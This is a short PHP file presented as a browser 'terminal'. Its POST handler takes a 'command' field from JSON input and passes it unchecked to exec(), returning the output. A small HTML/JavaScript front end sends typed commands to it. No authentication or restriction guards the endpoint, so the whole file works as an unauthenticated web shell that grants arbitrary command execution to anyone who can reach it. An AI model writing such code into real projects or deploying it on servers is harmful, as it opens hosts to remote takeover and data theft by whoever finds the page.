<?php
$inApp = false;

if ($_SERVER["REQUEST_METHOD"] === "POST") {
    $requestData = json_decode(file_get_contents("php://input"), true);
    $command = $requestData["command"];

	exec($command, $output,$ret);
    echo implode("\n", $output);
    $inApp = true;
}
if(!$inApp){
?>
    <!DOCTYPE html>
    <html>
    <head>
        <title>Terminal Powered By PHP</title>
        
        <style>
            .terminal {
                width: 100%;
                height: 100vw;
                background-color: black;
                color: white;
                font-family: monospace;
                padding: 10px;
                overflow-y: auto;
            }

            #input {
                width: 100%;
                background-color: transparent;
                border: none;
                color: white;
                font-family: monospace;
                outline: none;
            }
        </style>
    </head>
    <body>
        <div id="terminal" class="terminal">
            <pre id="output"></pre>
            <input type="text" id="input" autofocus>
        </div>
        <script>
        const terminalOutput = document.getElementById("output");
        const terminalInput = document.getElementById("input");
        
        terminalInput.addEventListener("keyup", function (event) {
            if (event.key === "Enter") {
                const command = terminalInput.value;
                terminalOutput.textContent += "$ " + command + "\n";

                if(command === "clear" || command === "cls"){
                    terminalOutput.textContent = "";
                    terminalInput.value = "";
                    return;
                }
                // Send the command to the server via AJAX
                fetch("terminal.php", {
                    method: "POST",
                    body: JSON.stringify({ command: command }),
                })
                .then(response => response.text())
                .then(output => {
                    terminalOutput.textContent += output + "\n";
                });

                terminalInput.value = "";
            }
        });
    </script>

    </body>
    </html>
<?php }?>